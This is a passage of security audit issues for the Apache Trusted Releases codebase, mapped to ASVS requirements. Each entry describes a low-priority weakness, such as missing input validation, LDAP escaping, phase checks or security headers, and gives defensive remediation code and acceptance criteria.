    # Use .get() with defaults instead of direct access
    run_id = run_data.get('id')
    if not run_id:
        logging.warning("Workflow run missing 'id' field, skipping")
        return
    
    name = run_data.get('name', 'Unknown')
    status = run_data.get('status', 'unknown')
    conclusion = run_data.get('conclusion')  # May be None
    
    # Check for required nested fields
    repository = run_data.get('repository', {})
    repo_name = repository.get('full_name', 'unknown')
    
    # Add schema version checking if available
    schema_version = run_data.get('_schema_version', '1.0')
    
    # ... process with validated data
```

Add schema version checking and fallback behavior for missing fields.

### Acceptance Criteria
- [ ] `.get()` used instead of direct dictionary access
- [ ] Defaults provided for optional fields
- [ ] Schema version checking implemented if available
- [ ] Fallback behavior for missing fields
- [ ] Unit test verifying robustness with missing fields

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-020
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-352 - Vote Value Not Constrained at Service Layer

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Vote value stored as plain string instead of validated Literal type, allowing arbitrary vote values beyond expected +1/0/-1. Vote values should be constrained to the valid set.

### Details
Affected file: `atr/storage/writers/vote.py`

Vote values should use Literal type for validation.

### Recommended Remediation
Create Literal type for vote values:

```python
from typing import Literal

VoteValue = Literal['+1', '0', '-1']

class VoteForm(BaseModel):
    value: VoteValue
    # ... other fields

async def cast_vote(value: VoteValue, ...):
    """Cast vote with type-enforced validation."""
    # ... existing logic
```

Update form and storage layer to enforce constraint.

### Acceptance Criteria
- [ ] Literal['+1', '0', '-1'] type used for vote values
- [ ] Form and storage layer enforce constraint
- [ ] Invalid vote values rejected
- [ ] Unit test verifying constraint

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-013
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-353 - No Length Validation on Revision Description

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Revision description field lacks maximum length constraint, potentially allowing excessively large descriptions that cause database bloat. Description fields should have reasonable size limits.

### Details
Affected file: `atr/storage/writers/revision.py`

Revision description should be length-constrained.

### Recommended Remediation
Add max_length constraint:

```python
from pydantic import Field

_MAX_DESCRIPTION_LENGTH = 10000  # 10KB

class RevisionData(BaseModel):
    description: str = Field(..., max_length=_MAX_DESCRIPTION_LENGTH)

async def create_revision(description: str, ...):
    """Create revision with description validation."""
    if len(description) > _MAX_DESCRIPTION_LENGTH:
        raise ValueError(
            f"Description exceeds maximum length of {_MAX_DESCRIPTION_LENGTH} characters"
        )
    
    # ... existing logic
```

Recommended maximum: 5,000-10,000 characters.

### Acceptance Criteria
- [ ] Maximum length constraint added (5K-10K characters)
- [ ] Clear error message if limit exceeded
- [ ] Unit test verifying length constraint

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-006, LOW-014
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-354 - phase Parameter as Unconstrained String

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Distribution phase parameter stored as free-form string instead of validated enum (development/testing/GA), allowing arbitrary phase values. Phase should be constrained to valid release phases.

### Details
Affected file: `atr/storage/writers/distributions.py`

Phase parameter should use enum or Literal type.

### Recommended Remediation
Create Literal type or enum for phase values:

```python
from typing import Literal

DistributionPhase = Literal['development', 'testing', 'GA']

class DistributionRecord(BaseModel):
    phase: DistributionPhase
    # ... other fields

async def create_distribution(phase: DistributionPhase, ...):
    """Create distribution with phase validation."""
    # ... existing logic
```

### Acceptance Criteria
- [ ] Literal type or enum defined for phase values
- [ ] Form and storage layer validate against allowed values
- [ ] Arbitrary phase values rejected
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-005, LOW-013, MED-002
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-355 - Inconsistent Safe Type Enforcement in Distribution Service Layer

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Distribution storage writers inconsistently enforce safe types, with some methods accepting raw strings while others require safe types. All identifier and key parameters should consistently use safe types.

### Details
Affected file: `atr/storage/writers/distributions.py`

Method signatures should consistently require safe types.

### Recommended Remediation
Standardize all distribution storage writer method signatures:

```python
from atr import safe

async def create_distribution(
    project_key: safe.ProjectKey,  # not str
    version_key: safe.VersionKey,  # not str
    platform: safe.PlatformName,   # not str
    phase: DistributionPhase,      # enum/Literal
    ...
):
    """Create distribution with consistent type enforcement."""
    # ... existing logic

async def update_distribution(
    distribution_id: safe.DistributionId,  # not str
    ...
):
    """Update distribution with consistent type enforcement."""
    # ... existing logic
```

### Acceptance Criteria
- [ ] All method signatures use safe types consistently
- [ ] No raw string parameters for identifiers/keys
- [ ] Consistent validation across all methods
- [ ] Unit test verifying type enforcement

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-002, LOW-024
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-356 - LDAP Filter Injection in load_account

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
LDAP admin library `load_account()` function constructs LDAP filters by string concatenation without escaping user input, potentially allowing LDAP filter injection for account enumeration.

### Details
Affected file: `asfpy/ldapadmin.py`

LDAP filters should never be constructed via string concatenation.

### Recommended Remediation
Use ldap3 library's filter escaping functions:

```python
from ldap3.utils.conv import escape_filter_chars

def load_account(uid: str):
    """Load account with proper LDAP filter escaping."""
    # Escape UID parameter before inserting into LDAP filter
    escaped_uid = escape_filter_chars(uid)
    ldap_filter = f"(uid={escaped_uid})"
    
    # ... execute LDAP search
```

Never construct LDAP filters via string concatenation without escaping.

### Acceptance Criteria
- [ ] `escape_filter_chars()` applied to UID parameter
- [ ] LDAP filter injection prevented
- [ ] Unit test verifying escaping with special characters
- [ ] Account enumeration attacks mitigated

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-005, LOW-027
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-357 - Unvalidated Parameters in LDAP DN Construction

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
LDAP admin library has 8 methods that construct Distinguished Names (DNs) by concatenating unvalidated parameters, potentially allowing DN injection if special characters (comma, equals, backslash) are not escaped.

### Details
Affected file: `asfpy/ldapadmin.py`

DN construction should use ldap3's DN escaping functions.

### Recommended Remediation
Use ldap3 library's DN escaping functions:

```python
from ldap3 import DN
from ldap3.utils.dn import escape_rdn

def build_user_dn(uid: str):
    """Build user DN with proper escaping."""
    # Option 1: Use ldap3.DN class
    dn = DN('uid', uid, 'ou=people', 'dc=example', 'dc=org')
    return str(dn)
    
    # Option 2: Use escape_rdn
    escaped_uid = escape_rdn(uid)
    dn = f"uid={escaped_uid},ou=people,dc=example,dc=org"
    return dn
```

Validate parameters against expected format before DN construction. Consider using ldap3's DN class for safe DN construction.

### Acceptance Criteria
- [ ] DN escaping applied to all DN construction methods (8 methods)
- [ ] ldap3.DN class used or escape_rdn applied
- [ ] Parameters validated against expected format
- [ ] Unit test verifying escaping with special characters

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-026, MED-005
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-358 - Admin-Only Draft Operations Skip Phase Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Two admin-only draft operations (cache_reset and recheck) create revisions without validating the release phase. While restricted to admin users via is_admin checks, they could still accidentally modify releases in non-draft phases. Defense in depth requires phase validation even for admin operations.

### Details
Affected file: `atr/post/draft.py`
- Lines 44-68: `cache_reset` operation
- Lines 162-183: `recheck` operation

The operations call storage layer methods that create revisions on releases in any phase.

### Recommended Remediation
Add phase validation using `session.release()` with phase filter:

```python
from atr.models import sql

async def cache_reset(session: web.Committer, project_key: str, version_key: str):
    """Reset cache with phase validation."""
    # Validate release is in draft phase
    release = await session.release(
        project_key=project_key,
        version_key=version_key,
        phase=sql.ReleasePhase.RELEASE_CANDIDATE_DRAFT
    )
    
    if not release:
        raise ValueError("Release must be in draft phase for cache reset")
    
    # ... existing cache reset logic
```

Apply similar validation to `recheck` operation.

### Acceptance Criteria
- [ ] Phase validation added to cache_reset operation
- [ ] Phase validation added to recheck operation
- [ ] Only draft-phase releases can be modified
- [ ] Unit test verifying phase validation

### References
- Source reports: L1:2.3.1.md
- Related findings: ASVS-231-MED-002
- ASVS sections: 2.3.1

### Priority
Low

---

## Issue: FINDING-359 - Pagination Offset Validation Never Executes Due to Typo

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `_pagination_args_validate()` function contains a typo where it checks `hasattr(query_args, 'offest')` instead of `'offset'`. This causes the offset validation block (checking for bounds 0 to 1,000,000) to never execute, allowing unbounded offset values that could cause database performance issues.

### Details
Affected file: `atr/api/__init__.py` line 1290

This affects three API endpoints:
- `/api/releases/list`
- `/api/ssh-keys/list/<asf_uid>`
- `/api/tasks/list`

The validation code exists but is never called due to the incorrect attribute name.

### Recommended Remediation
Fix the typo:

```python
def _pagination_args_validate(query_args):
    """Validate pagination arguments."""
    # Fix typo: 'offest' -> 'offset'
    if hasattr(query_args, 'offset'):
        if not (0 <= query_args.offset <= 1_000_000):
            raise ValueError("Offset must be between 0 and 1,000,000")
    
    # ... existing limit validation
```

Add unit tests for pagination validation:

```python
def test_pagination_offset_validation():
    """Test offset validation catches invalid values."""
    # Test negative offset
    with pytest.raises(ValueError):
        _pagination_args_validate(MockArgs(offset=-1))
    
    # Test offset exceeds maximum
    with pytest.raises(ValueError):
        _pagination_args_validate(MockArgs(offset=1_000_001))
    
    # Test valid offset
    _pagination_args_validate(MockArgs(offset=100))  # Should not raise
```

### Acceptance Criteria
- [ ] Typo fixed ('offest' -> 'offset')
- [ ] Offset validation executes correctly
- [ ] Negative offsets rejected
- [ ] Offsets exceeding 1,000,000 rejected
- [ ] Unit tests added to catch similar issues

### References
- Source reports: L1:2.3.1.md
- Related findings: None
- ASVS sections: 2.3.1

### Priority
Low

---

## Issue: FINDING-360 - Vote Duration Minimum Not Enforced in Pass/Fail Determination

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `_vote_outcome_format()` function returns `passed=True` even when the minimum vote duration (72-144 hours per ASF policy) has not elapsed. While the outcome message indicates the vote is still open ('would pass if closed now'), the boolean flag is used for resolution email generation, potentially allowing premature resolution.

### Details
Affected file: `atr/tabulate.py` lines 226-259

The function calculates `duration_hours_remaining` but does not enforce it as a requirement for the `passed` status.

### Recommended Remediation
**If strict enforcement is desired:**

```python
def _vote_outcome_format(vote_data):
    """Format vote outcome with duration enforcement."""
    # ... existing tally logic
    
    # Calculate duration
    duration_hours_remaining = max(0, required_hours - elapsed_hours)
    
    # Enforce minimum duration for passed status
    if duration_hours_remaining > 0:
        return {
            'passed': False,
            'message': f'Vote would pass if closed now, but {duration_hours_remaining}h remain',
            'tallies': tallies
        }
    
    # ... existing pass/fail logic
```

**If current behavior is intentional per ASF governance allowing early closure:**

Document this decision and ensure resolution handlers validate duration before actually transitioning the release phase. Consider adding a `minimum_duration_met` boolean to the return value for more explicit handling.

### Acceptance Criteria
- [ ] Either: Duration enforced in passed status determination
- [ ] Or: Behavior documented as intentional with validation in resolution handlers
- [ ] `minimum_duration_met` boolean added for explicit handling
- [ ] Unit test verifying duration enforcement or documentation

### References
- Source reports: L1:2.3.1.md
- Related findings: ASVS-231-MED-005
- ASVS sections: 2.3.1

### Priority
Low

---

## Issue: FINDING-361 - Background Task File Import Missing Phase Check (TOCTOU)

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `_import_files_core()` function processes SVN file imports as a background task without phase validation. This creates a potential time-of-check-time-of-use (TOCTOU) race condition where the release phase could change between when the task was queued and when it executes.

### Details
Affected file: `atr/tasks/svn.py`

While the storage layer provides authorization checks, the phase may have transitioned during task execution (e.g., from DRAFT to CANDIDATE), making file imports no longer appropriate.

### Recommended Remediation
Add phase validation at the beginning of `_import_files_core()`:

```python
from atr.models import sql

async def _import_files_core(project_key: str, version_key: str, ...):
    """Import files with phase validation."""
    # Validate release is still in appropriate phase
    release = await session.release(
        project_key=project_key,
        version_key=version_key,
        phase=sql.ReleasePhase.RELEASE_CANDIDATE_DRAFT
    )
    
    if not release:
        logging.warning(
            f"Aborting file import for {project_key}/{version_key}: "
            f"release no longer in draft phase"
        )
        return
    
    # ... existing import logic
```

### Acceptance Criteria
- [ ] Phase validation added at task entry point
- [ ] Release verified to be in RELEASE_CANDIDATE_DRAFT phase
- [ ] Import aborted with log if phase has changed
- [ ] Unit test verifying TOCTOU protection

### References
- Source reports: L1:2.3.1.md
- Related findings: ASVS-231-MED-002
- ASVS sections: 2.3.1

### Priority
Low

---

## Issue: FINDING-362 - Hash File Filename Component Not Cross-Validated

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
BSD-style hash files contain both a hash value and a filename (`HASH  FILENAME\n`). The current implementation validates the hash against the artifact content using timing-safe comparison, but does not validate that the filename portion matches the actual artifact filename. A TODO comment acknowledges this gap.

### Details
Affected file: `atr/tasks/checks/hashing.py` lines 50-55

An attacker could provide a hash file with the correct hash but wrong filename, which would pass validation despite the mismatch.

### Recommended Remediation
Extract expected_filename from hash file content and compare against actual artifact filename:

```python
def validate_hash_file(hash_file_content: str, artifact_path: Path, computed_hash: str):
    """Validate hash file with filename cross-check."""
    # Parse hash file: "HASH  FILENAME\n"
    parts = hash_file_content.strip().split('  ', 1)
    if len(parts) != 2:
        return CheckResult.FAILURE("Invalid hash file format")
    
    stored_hash, expected_filename = parts
    actual_filename = artifact_path.name
    
    # Validate filename matches
    if expected_filename != actual_filename:
        return CheckResult.FAILURE(
            f"Filename mismatch: hash file references '{expected_filename}' "
            f"but artifact is '{actual_filename}'"
        )
    
    # Validate hash (existing timing-safe comparison)
    if not secrets.compare_digest(stored_hash, computed_hash):
        return CheckResult.FAILURE("Hash mismatch")
    
    return CheckResult.SUCCESS
```

### Acceptance Criteria
- [ ] Filename extracted from hash file content
- [ ] Filename compared against actual artifact filename
- [ ] CheckResult.FAILURE returned on mismatch with descriptive error
- [ ] Unit test verifying filename validation

### References
- Source reports: L2:2.1.2.md
- Related findings: None
- ASVS sections: 2.1.2

### Priority
Low

---

## Issue: FINDING-363 - Documentation Missing Platform-Specific Distribution Rules

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The validation logic for distribution records varies by platform (PyPI requires `owner_namespace`, direct downloads do not), but these platform-specific rules are not documented in `input-validation.md`. API consumers cannot determine requirements from documentation and must read code to understand platform-specific rules.

### Details
Affected files:
- `atr/docs/input-validation.md` (missing documentation)
- `atr/shared/distribution.py` (validation implementation)
- `atr/models/distribution.py` (models)

### Recommended Remediation
Add 'Distribution Platform Validation' section to `input-validation.md`:

```markdown
## Distribution Platform Validation

Distribution records have platform-specific validation requirements:

### PyPI
- **Requires:** `distribution_owner_namespace` as PyPI package identifier
- **Format:** PyPI package name (lowercase, hyphens allowed)
- **Example:** `apache-airflow`

### Maven
- **Requires:** `distribution_owner_namespace` as group ID
- **Format:** Reverse domain notation (e.g., `org.apache.maven`)
- **Example:** `org.apache.maven`

### npm
- **Requires:** `distribution_owner_namespace` as scope
- **Format:** `@scope` format (e.g., `@apache`)
- **Example:** `@apache/arrow`

### Direct Download
- **Requires:** No additional namespace requirements
- **Notes:** Uses download URL directly without platform-specific identifier
```

### Acceptance Criteria
- [ ] Platform-specific validation rules documented
- [ ] Examples provided for each platform
- [ ] Format requirements clearly stated
- [ ] Documentation matches implementation

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-MED-002
- ASVS sections: 2.1.2

### Priority
Low

---

## Issue: FINDING-364 - Undocumented Default Classification When No Markers Found

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When file classification detects no markers (`source_count == 0`, `binary_count == 0`, `docs_count == 0`), the function defaults to `FileType.SOURCE`. This business logic decision has security implications (affects license checking requirements) but the rationale is not documented.

### Details
Affected file: `atr/classify.py` lines 121-127

The rationale for choosing SOURCE rather than UNKNOWN or BINARY is not explained.

### Recommended Remediation
Add 'File Classification Rules' section to `input-validation.md`:

```markdown
## File Classification Rules

File classification determines appropriate compliance checks:

### Classification Signals
- **Source markers:** File extensions (`.py`, `.java`, etc.), shebang lines
- **Binary markers:** File extensions (`.jar`, `.so`, etc.), binary content detection
- **Documentation markers:** File extensions (`.md`, `.txt`, etc.), documentation directories

### Default Classification
When no classification markers are detected:
- **Default:** `FileType.SOURCE`
- **Rationale:** SOURCE classification requires strictest license checks, providing a security-conscious default
- **Impact:** Files without clear classification signals receive maximum scrutiny

### Classification Priority
1. Multiple marker types: Majority classification wins
2. Tie scenarios: SOURCE classification preferred
3. No markers: Default to SOURCE
```

### Acceptance Criteria
- [ ] Classification rules documented
- [ ] Default behavior explained with rationale
- [ ] Security implications described
- [ ] Documentation matches implementation

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-MED-002
- ASVS sections: 2.1.2

### Priority
Low

---

## Issue: FINDING-365 - Global Environment Mutation in Concurrent Context

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The function `_ensure_clone_identity_env` mutates `os.environ` (process-level shared state) from within an async task context. While current values are constants and likely safe, this pattern is fragile for future modifications. `os.environ` is process-global, shared across all async tasks with no synchronization/locking around mutation.

### Details
Affected file: `atr/tasks/checks/compare.py` lines 214-216

This creates potential race conditions in concurrent contexts.

### Recommended Remediation
**Option 1: Pass environment explicitly (preferred)**

```python
def _get_clone_identity_env():
    """Get clone identity environment without mutation."""
    return {
        'GIT_AUTHOR_NAME': 'ATR',
        'GIT_AUTHOR_EMAIL': 'atr@apache.org',
        'GIT_COMMITTER_NAME': 'ATR',
        'GIT_COMMITTER_EMAIL': 'atr@apache.org',
    }

async def git_clone(...):
    """Clone with explicit environment."""
    env = {**os.environ, **_get_clone_identity_env()}
    await subprocess_run(..., env=env)
```

**Option 2: Use context manager**

```python
@contextlib.contextmanager
def clone_identity_env():
    """Temporarily set clone identity environment."""
    old_values = {}
    identity = _get_clone_identity_env()
    
    # Save and set
    for key, value in identity.items():
        old_values[key] = os.environ.get(key)
        os.environ[key] = value
    
    try:
        yield
    finally:
        # Restore
        for key, old_value in old_values.items():
            if old_value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = old_value

async def git_clone(...):
    """Clone with context-managed environment."""
    with clone_identity_env():
        await subprocess_run(...)
```

### Acceptance Criteria
- [ ] Environment no longer mutated globally
- [ ] Explicit environment passed to subprocess OR context manager used
- [ ] No interference between concurrent tasks
- [ ] Unit test verifying isolation

### References
- Source reports: L2:2.1.2.md
- Related findings: None
- ASVS sections: 2.1.2

### Priority
Low

---

## Issue: FINDING-366 - Subprocess Timeouts Scattered and Inconsistent

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application implements subprocess timeouts to prevent hung processes, but timeout values are scattered across files as magic numbers without centralized documentation or rationale. Apache RAT and SBOM generation use 300s timeout, while SVN export uses 600s timeout with no documented rationale.

### Details
Affected files:
- `atr/tasks/checks/rat.py`: Various locations with 300s timeout
- `atr/tasks/sbom.py`: Various locations with 300s timeout
- `atr/tasks/svn.py`: Various locations with 600s timeout

No documented rationale for these specific values or consistency guidance.

### Recommended Remediation
Centralize timeout constants in `atr/constants/timeouts.py`:

```python
"""Subprocess timeout constants with documented rationale."""

# Apache RAT license checking
# Typical duration: 30-60s for large archives
# Buffer: 5x for extra-large archives and slow systems
RAT_TIMEOUT_SECONDS = 300

# SBOM generation (syft)
# Typical duration: 20-40s for large archives
# Buffer: 7-15x for complex dependency analysis
SBOM_GENERATION_TIMEOUT_SECONDS = 300

# SVN export operations
# Typical duration: 60-120s for large repositories
# Buffer: 5-10x for slow network conditions
SVN_EXPORT_TIMEOUT_SECONDS = 600
```

Document typical durations, buffer rationale, and purpose in `docs/business-logic-limits.md`:

```markdown
## Subprocess Timeouts

| Operation | Timeout | Typical Duration | Rationale |
|-----------|---------|------------------|-----------|
| Apache RAT | 300s | 30-60s | 5x buffer for large archives |
| SBOM Generation | 300s | 20-40s | 7-15x buffer for complex analysis |
| SVN Export | 600s | 60-120s | 5-10x buffer for slow networks |
```

### Acceptance Criteria
- [ ] Timeout constants centralized in constants/timeouts.py
- [ ] Each constant documented with rationale
- [ ] Business logic limits documented in docs/
- [ ] All usages updated to reference constants

### References
- Source reports: L2:2.1.3.md
- Related findings: None
- ASVS sections: 2.1.3

### Priority
Low

---

## Issue: FINDING-367 - Release Phase Transition Rules Not Centrally Documented

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application implements a state machine for release phases (DRAFT → CANDIDATE → PREVIEW → RELEASE) with complex preconditions for each transition, but these rules are scattered across multiple files without centralized documentation.

### Details
Phase transition logic exists in:
- `atr/get/finish.py`
- `atr/storage/writers/announce.py`
- `atr/db/interaction.py`

There is no single source of truth for transition rules.

### Recommended Remediation
Create `docs/release-state-machine.md` documenting all phase transitions:

```markdown
# Release State Machine

## Phase Transitions

### DRAFT → CANDIDATE
**Preconditions:**
- At least one file uploaded to revision
- No blocking check failures (license issues, etc.)
- Authorization: Committer with release manager role

**Actions:**
- Release becomes visible in public listings
- Automated checks triggered
- Distribution preparation initiated

**Validation Location:** `atr/get/finish.py:transition_to_candidate()`

### CANDIDATE → PREVIEW
**Preconditions:**
- Vote thread created and completed
- Minimum vote duration elapsed (72-144 hours)
- Vote passed (3+ binding +1 votes, more +1 than -1)
- All required distributions recorded

**Actions:**
- Release moved to preview area
- Announcement email sent to announce@
- Distribution synchronization initiated

**Validation Location:** `atr/storage/writers/announce.py:resolve_vote()`

### PREVIEW → RELEASE
**Preconditions:**
- All distributions confirmed available
- Mirror synchronization complete (24-48 hours)
- Final announcement approval

**Actions:**
- Release moved to production area
- Official release announcement
- Website updates

**Validation Location:** `atr/storage/writers/announce.py:publish_release()`

## State Diagram

```
[DRAFT] ---> [CANDIDATE] ---> [PREVIEW] ---> [RELEASE]
   |             |                |              |
   |             |                |              |
   +-------------+----------------+--------------+
                     [ABANDONED]
```

## Validation Reference

| Transition | File | Function | Line |
|------------|------|----------|------|
| DRAFT→CANDIDATE | atr/get/finish.py | transition_to_candidate | ~120 |
| CANDIDATE→PREVIEW | atr/storage/writers/announce.py | resolve_vote | ~200 |
| PREVIEW→RELEASE | atr/storage/writers/announce.py | publish_release | ~350 |
```

### Acceptance Criteria
- [ ] All phase transitions documented with preconditions
- [ ] Actions for each transition documented
- [ ] Validation locations referenced
- [ ] State diagram included
- [ ] Reference table with file locations

### References
- Source reports: L2:2.1.3.md
- Related findings: None
- ASVS sections: 2.1.3

### Priority
Low

---

## Issue: FINDING-368 - SSH Key Addition Lacks Duplicate Guard

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
SSH key addition in `FoundationCommitter.add_key()` has no existence check or conflict handling. Function directly inserts key without checking for duplicates. If database has unique constraint on fingerprint, concurrent duplicate submissions produce unhandled IntegrityError, causing HTTP 500 error instead of idempotent success or clear 'key already exists' message.

### Details
Affected file: `atr/storage/writers/ssh.py` lines 40-44

Impact mitigated by rate limiting (10 req/hour) and user-scoped operation, but produces poor error message.

### Recommended Remediation
Add idempotent duplicate handling:

```python
async def add_key(self, fingerprint: str, public_key: str):
    """Add SSH key with duplicate handling."""
    # Check for existing key with same fingerprint
    existing = await self.__data.ssh_key(fingerprint=fingerprint).get()
    
    if existing:
        # Idempotent: return success if same user
        if existing.asf_uid == self.__asf_uid:
            return fingerprint
        else:
            # Conflict: key belongs to different user
            raise AccessError(
                'SSH key already registered to another user'
            )
    
    # Insert new key
    # ... existing insert logic
    
    return fingerprint
```

This follows the correct pattern in `keys.py` using `ON CONFLICT DO NOTHING`.

### Acceptance Criteria
- [ ] Existence check before insert
- [ ] Idempotent success if key already exists for same user
- [ ] Clear error if key exists for different user
- [ ] Unit test verifying duplicate handling

### References
- Source reports: L2:2.3.4.md
- Related findings: References correct pattern in keys.py
- ASVS sections: 2.3.4

### Priority
Low

---

## Issue: FINDING-369 - Task Result Update Lacks Status Pre-Condition Check

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Task result processing in `_task_result_process()` lacks status and PID verification before update. Function updates task status to COMPLETED without checking current status is ACTIVE or that calling process owns the task. Currently theoretical risk due to atomic claim mechanism, but becomes exploitable when stuck task recovery is implemented (acknowledged TODO).

### Details
Affected file: `atr/worker.py` lines 218-230

This could allow task results to be silently overwritten if recovery mechanism resets task while original worker completes.

### Recommended Remediation
Add defensive checks before updating task results:

```python
async def _task_result_process(task_id: int, result: dict):
    """Process task result with pre-condition checks."""
    # Load current task state
    task_obj = await Task.get(id=task_id)
    
    # Check task is still ACTIVE
    if task_obj.status != sql.TaskStatus.ACTIVE:
        logging.warning(
            f"Task {task_id} status is {task_obj.status}, expected ACTIVE. "
            f"Skipping result update (possible recovery race)."
        )
        return
    
    # Check task is owned by this process
    if task_obj.pid != os.getpid():
        logging.warning(
            f"Task {task_id} owned by PID {task_obj.pid}, not {os.getpid()}. "
            f"Skipping result update (possible recovery race)."
        )
        return
    
    # Safe to update
    await task_obj.update(status=sql.TaskStatus.COMPLETED, result=result)
```

### Acceptance Criteria
- [ ] Status verified as ACTIVE before update
- [ ] PID verified as current process before update
- [ ] Warning logged if pre-conditions fail
- [ ] No update if checks fail (prevents race with recovery)
- [ ] Unit test verifying pre-condition checks

### References
- Source reports: L2:2.3.4.md
- Related findings: References TODO for stuck task recovery at worker.py lines 24-27, References correct atomic claim in _task_next_claim()
- ASVS sections: 2.3.4

### Priority
Low

---

## Issue: FINDING-370 - Missing All Framing Protection for /~sbp/ on Dev VM

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/~sbp/` path on the development VM (tooling-vm-ec2-de.apache.org) is configured to serve content directly from a user's home directory without any framing protection headers. Neither `frame-ancestors` in CSP nor `X-Frame-Options` is set, leaving the content completely unprotected against iframe embedding.

### Details
Affected file: `tooling-vm-ec2-de.apache.org.yaml` lines 161-168

The path uses `ProxyPass /~sbp/ !` so requests are NOT proxied to the application. Apache serves content directly from `/home/sbp/www/` with:
- No CSP header set
- No X-Frame-Options set
- No other framing protection

Limited practical impact as this is a developer directory on a development VM only.

### Recommended Remediation
Add comprehensive security headers to the `/~sbp/` Directory block:

```yaml
<Directory /home/sbp/www/>
    Options +Indexes +FollowSymLinks -ExecCGI
    Require all granted
    IndexOptions FancyIndexing NameWidth=* FoldersFirst ScanHTMLTitles DescriptionWidth=*
    DefaultType text/plain
    Header always set Content-Security-Policy "frame-ancestors 'none'"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "no-referrer"
    Header always set Cross-Origin-Resource-Policy "same-origin"
    SetHandler none
</Directory>
```

### Acceptance Criteria
- [ ] CSP frame-ancestors 'none' header added
- [ ] X-Frame-Options DENY header added
- [ ] X-Content-Type-Options nosniff header added
- [ ] Referrer-Policy no-referrer header added
- [ ] Cross-Origin-Resource-Policy same-origin header added
- [ ] Unit test verifying headers are present

### References
- Source reports: L2:3.4.6.md, L2:3.4.4.md, L2:3.4.5.md
- Related findings: FINDING-190, FINDING-192
- ASVS sections: 3.4.6, 3.4.4, 3.4.5

### Priority
Low

---

## Issue: FINDING-371 - Sec-Fetch-Site Validation Permits Absent Header and Same-Site Requests

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The Sec-Fetch-Site validation explicitly allows None (header absent) in the OAuth endpoint and global validation, necessary for backward compatibility with older browsers and non-browser clients. However, ASVS 3.5.3 calls for strict validation. The global validation also permits 'same-site' requests, meaning other *.apache.org subdomains could make state-changing requests.

### Details
Affected files:
- `src/asfquart/generics.py` line 33
- `atr/server.py` lines 360-374

Allowing None creates a narrow window where attackers can deliberately omit headers to bypass this specific check, though other controls still apply (CSRF tokens, OAuth state parameter, authentication).

Impact is limited due to layered defenses:
- CSRF protection
- JWT authentication
- CSP form-action 'self'

### Recommended Remediation
For browser-only endpoints, apply comprehensive validation when any Sec-Fetch header is present:

```python
def _validate_sec_fetch_for_browser(headers):
    """Strict validation when Sec-Fetch headers indicate a modern browser."""
    has_sec_fetch = any([
        headers.get("Sec-Fetch-Site"),
        headers.get("Sec-Fetch-Mode"),
        headers.get("Sec-Fetch-Dest")
    ])
    
    if not has_sec_fetch:
        # Legacy browser or non-browser client - allow but log
        logging.info("Request without Sec-Fetch headers (legacy client)")
        return True
    
    # Modern browser detected - enforce strict validation
    site = headers.get("Sec-Fetch-Site")
    mode = headers.get("Sec-Fetch-Mode")
    dest = headers.get("Sec-Fetch-Dest")
    
    if site not in ("same-origin", "none"):
        logging.warning(f"Rejected request with Sec-Fetch-Site: {site}")
        return False
    if mode not in ("navigate", "same-origin"):
        logging.warning(f"Rejected request with Sec-Fetch-Mode: {mode}")
        return False
    if dest not in ("document", "empty"):
        logging.warning(f"Rejected request with Sec-Fetch-Dest: {dest}")
        return False
    
    return True
```

For global validation, consider tightening to block 'same-site' for non-GET requests, or document the trust model for apache.org subdomains.

Add test cases to verify rejection of deliberately omitted headers in modern browser contexts.

### Acceptance Criteria
